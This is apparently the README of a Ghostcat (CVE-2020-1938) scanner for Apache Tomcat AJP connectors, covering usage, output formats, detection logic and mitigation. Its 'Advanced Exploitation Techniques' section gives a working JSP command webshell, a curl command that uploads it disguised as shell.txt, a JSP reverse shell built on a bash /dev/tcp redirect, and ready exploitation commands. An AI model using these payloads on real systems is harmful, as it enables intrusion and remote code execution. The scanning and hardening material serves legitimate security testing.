# 👻 Ghostcat Scanner — CVE-2020-1938

**Apache Tomcat AJP Local File Inclusion / Remote Code Execution Detector**

Standalone tool (Go + Python) for detecting CVE-2020-1938 (Ghostcat) vulnerability on Apache Tomcat servers via the AJP (Apache JServ Protocol) connector on port 8009.

## ⚠️ What is CVE-2020-1938 (Ghostcat)?

CVE-2020-1938 is a **file inclusion vulnerability** in Apache Tomcat's AJP connector that allows attackers to:

1. **Read arbitrary files** from the web application directory (Local File Inclusion)
2. **Achieve Remote Code Execution (RCE)** under specific conditions

### Vulnerability Details

| Field | Value |
|-------|-------|
| CVE | CVE-2020-1938 |
| CNVD | CNVD-2020-10487 |
| CVSS Score | 9.8 (Critical) |
| Protocol | AJP 1.3 (default port 8009) |
| Affected Versions | Tomcat 6.x, 7.0.0–7.0.99, 8.5.0–8.5.50, 9.0.0.M1–9.0.30 |
| Fixed Versions | 7.0.100, 8.5.51, 9.0.31+ |

### How Exploitation Works

```
┌─────────────────────────────────────────────────────────────────┐
│                    GHOSTCAT EXPLOITATION CHAIN                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  STEP 1: Attacker sends crafted AJP Forward Request             │
│          with javax.servlet.include.* attributes                │
│                                                                  │
│  STEP 2: Tomcat trusts AJP request and includes specified file  │
│                                                                  │
│  STEP 3: File content returned in response                     │
│                                                                  │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  FILE READ (always works if vulnerable):               │   │
│  │  - Read /WEB-INF/web.xml                               │   │
│  │  - Read /WEB-INF/classes/                              │   │
│  │  - Read any file in webapp directory                   │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                  │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  RCE (requires EXTRA conditions):                      │   │
│  │  1. Target has FILE UPLOAD feature                     │   │
│  │  2. Uploaded files stored in webapp directory          │   │
│  │  3. Attacker can reach AJP port directly               │   │
│  │                                                         │   │
│  │  EXPLOIT CHAIN:                                        │   │
│  │  a) Upload JSP webshell (disguised as .txt, .jpg)      │   │
│  │  b) Use Ghostcat to INCLUDE uploaded file as JSP       │   │
│  │  c) Tomcat compiles and executes JSP → RCE!            │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

## 📁 Files

| File | Language | Description |
|------|----------|-------------|
| `ghostcat.go` | Go | Performance-optimized scanner |
| `ghostcat.py` | Python | Full-featured scanner with JSON output |
| `go.mod` | Go | Go module file |
| `README.md` | Markdown | This file |
| `DOCUMENTATION.md` | Markdown | Feature documentation |

## 🚀 Build & Run

### Go Version (Faster)

```bash
cd ghostcat
go build -o ghostcat .
./ghostcat targets.txt
```

### Python Version (More Features)

```bash
cd ghostcat
python3 ghostcat.py targets.txt
```

## 📋 How to Use

### Basic Scan

```bash
# Python
python3 ghostcat.py targets.txt

# Go
./ghostcat targets.txt
```

### With Options

```bash
# Custom port, workers, timeout
python3 ghostcat.py targets.txt -p 8009 -w 20 -t 10

# Save all results to file
python3 ghostcat.py targets.txt -o results.txt

# Save ONLY vulnerable targets to text file
python3 ghostcat.py targets.txt -f vuln-targets.txt

# Save vulnerable targets as JSON
python3 ghostcat.py targets.txt -j vulns.json

# Save as CSV (for spreadsheets)
python3 ghostcat.py targets.txt --csv results.csv

# Verbose mode (show response body)
python3 ghostcat.py targets.txt -v

# Combine multiple output formats
python3 ghostcat.py targets.txt \
  -f vulns.txt \
  -j vulns.json \
  -o all-results.txt \
  --csv results.csv
```

## 🎯 Targets File Format

One host per line (IP or hostname). Lines starting with `#` are ignored.

```txt
# Sample targets file
192.168.1.10
192.168.1.20
tomcat.example.com
10.0.0.50:8009    # You can specify port with :port suffix
```

## 💾 Saving Vulnerable Targets

At the end of each scan, the tool displays a **summary of vulnerable targets found**:

```
  ─────────────────────────────────────────────────────────────
  📊 Scan Summary:
    🔴 Vulnerable:      3
    🟢 Open (safe):     5
    ⚫ Closed/Filtered: 2

  📁 Vulnerable Targets Found: 3
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Target                           Status
  ⚠ 192.168.1.100:8009            VULNERABLE (AJP 8009, 1247 bytes)
  ⚠ 10.0.0.50:8009                VULNERABLE (AJP 8009, 2048 bytes)
  ⚠ tomcat.example.com:8009       VULNERABLE (AJP 8009, 1536 bytes)
```

### Output File Formats

#### Text File (`-f` / `--vuln-file`)

```
# Ghostcat Vulnerable Targets Report
# CVE-2020-1938
# Generated: 2026-09-06 10:07:23
# Total Vulnerable: 3
#==========================================================================

1. 192.168.1.100:8009
   File: /WEB-INF/web.xml
   Response Size: 1247 bytes
   Response Time: 45ms
   Found At: 2026-09-06T10:07:23.123456
------------------
2. 10.0.0.50:8009
   ...

==========================================================================
SUMMARY: 3 vulnerable target(s) found
```

#### JSON File (`-j` / `--json`)

```json
{
  "scan_info": {
    "vulnerability": "CVE-2020-1938",
    "name": "Ghostcat - Apache Tomcat AJP File Read/Inclusion",
    "cvss_score": 9.8,
    "generated_at": "2026-09-06T10:07:23.123456"
  },
  "summary": {
    "total_vulnerable": 3
  },
  "targets": [
    {
      "host": "192.168.1.100",
      "port": 8009,
      "filepath": "/WEB-INF/web.xml",
      "body_length": 1247,
      "response_time_ms": 45,
      "found_at": "2026-09-06T10:07:23.123456"
    }
  ]
}
```

#### All Results (`-o` / `--output`)

```
# Ghostcat Scan Results
# CVE-2020-1938
# Generated: 2026-09-06 10:07:23
# Total Targets: 10
# Vulnerable: 3
#==========================================================================

192.168.1.100:8009	VULNERABLE	1247	45ms	
10.0.0.50:8009	OPEN_SAFE	0	12ms	
192.168.1.20:8009	CLOSED	0	5000ms	port closed
...
```

#### CSV (`--csv`)

```csv
host,port,status,status_code,body_length,response_time_ms,error
192.168.1.100,8009,VULNERABLE,200,1247,45,
10.0.0.50,8009,OPEN_SAFE,403,0,12,
192.168.1.20,8009,CLOSED,0,0,5000,port closed
```

## 🔍 Detection Logic

| Response | Verdict |
|----------|---------|
| TCP connect fails | Port closed / Host unreachable |
| AJP response with `200 OK` + body containing XML/web-app tags | **VULNERABLE** |
| AJP response with `200 OK` + non-empty body | **VULNERABLE** (likely) |
| AJP response with `403`/`404`/other | Open but not vulnerable (patched or restricted) |
| No AJP response | Not an AJP service |

## 🔧 Advanced Exploitation Techniques

### Technique 1: File Read (Always Possible)

The basic exploit reads any file from the webapp directory:

```python
# The tool already does this - reads /WEB-INF/web.xml by default
# To read other files, modify the path_info attribute:
target_file = "/WEB-INF/web.xml"  # Default
target_file = "/WEB-INF/classes/application.properties"
target_file = "/META-INF/MANIFEST.MF"
target_file = "/WEB-INF/lib/"
```

### Technique 2: RCE via File Upload (Advanced)

**Requirements:**
1. Target application has file upload feature
2. Uploaded files stored in webapp directory
3. AJP port (8009) accessible from attacker

**Steps:**

```bash
# 1. Create JSP webshell (shell.jsp)
cat > shell.jsp << 'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(
        new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
}
%>
EOF

# 2. Upload via application's upload feature
# (disguise as .txt, .jpg, or any allowed extension)
curl -F "file=@shell.jsp;filename=shell.txt" http://target/upload

# 3. Use Ghostcat to include and execute the uploaded file
# Set request_uri to end with .jsp so Tomcat compiles it
python3 ghostcat.py targets.txt -p 8009  # Then manually exploit
```

**Using existing tools (ajpShooter.py):**

```bash
# Clone the Ghostcat exploit
git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487
cd Ghostcat-CNVD-2020-10487

# Read file
python3 ajpShooter.py http://target:8080/ 8009 /WEB-INF/web.xml read

# RCE (if file upload exists)
python3 ajpShooter.py http://target:8080/ 8009 /uploads/shell.txt eval
```

**Using Metasploit:**

```bash
msfconsole
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS target
set RPORT 8009
set FILENAME /WEB-INF/web.xml
run
```

### Technique 3: Reverse Shell via Uploaded JSP

```jsp
<%@ page import="java.io.*,java.util.*" %>
<%
String host = request.getParameter("host");
int port = Integer.parseInt(request.getParameter("port"));
String cmd = "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1";
Process p = Runtime.getRuntime().exec(cmd);
%>
```

Upload this as a file, then include it via Ghostcat to get a reverse shell.

## 🛡️ Mitigation

### Immediate Actions

1. **Disable AJP Connector**
   ```xml
   <!-- Comment out or remove this line in $CATALINA_HOME/conf/server.xml -->
   <!-- 
   <Connector port="8009" protocol="AJP/1.3" redirectPort="8443" />
   -->
   ```

2. **Set AJP Secret** (if AJP is needed)
   ```xml
   <Connector port="8009" protocol="AJP/1.3" redirectPort="8443" 
              address="127.0.0.1" secret="YOUR_SECRET_HERE" />
   ```

3. **Upgrade Tomcat**
   - Apache Tomcat 9.0.31 or later
   - Apache Tomcat 8.5.51 or later
   - Apache Tomcat 7.0.100 or later

4. **Firewall Rules**
   ```bash
   # Block external access to AJP port
   iptables -A INPUT -p tcp --dport 8009 -s 127.0.0.1 -j ACCEPT
   iptables -A INPUT -p tcp --dport 8009 -j DROP
   ```

5. **Network Segmentation**
   - Restrict AJP access to trusted internal networks only
   - Do NOT expose port 8009 to the internet

## 📊 Usage Examples

### Single Target
```bash
echo "192.168.1.100" > targets.txt
python3 ghostcat.py targets.txt
```

### Multiple Targets
```bash
cat > targets.txt << EOF
192.168.1.100
192.168.1.101
10.0.0.50
tomcat.example.com
EOF
python3 ghostcat.py targets.txt -f found-vulns.txt -j vulns.json
```

### Subnet Scanning
```bash
# Generate targets using nmap or naabu
nmap -sn 192.168.1.0/24 -oG tmp.txt
grep "Status: Up" tmp.txt | awk '{print $2}' > targets.txt

# Then scan
python3 ghostcat.py targets.txt -w 50 -t 2 -f results.txt
```

## ⚖️ Legal Disclaimer

**This tool is for AUTHORIZED SECURITY TESTING ONLY.**

- Unauthorized access to computer systems is illegal in most jurisdictions
- Always obtain proper written authorization before scanning any target
- Use only on systems you own or have explicit permission to test
- The developers assume no liability for misuse of this tool

## 🔗 References

- [Apache Tomcat Security Advisory](https://tomcat.apache.org/security-9.html)
- [Tenable: CVE-2020-1938 Analysis](https://www.tenable.com/blog/cve-2020-1938-ghostcat-apache-tomcat-ajp-file-readinclusion-vulnerability-cnvd-2020-10487)
- [Trend Micro: Busting Ghostcat](https://www.trendmicro.com/en_us/research/20/c/busting-ghostcat-an-analysis-of-the-apache-tomcat-vulnerability-cve-2020-1938-and-cnvd-2020-10487.html)
- [SentinelOne: CVE-2020-1938](https://www.sentinelone.com/vulnerability-database/cve-2020-1938/)
- [ExtraHop: Ghostcat Exploit Detection](https://www.extrahop.com/resources/detections/cve-2020-1938-ghostcat-exploit)
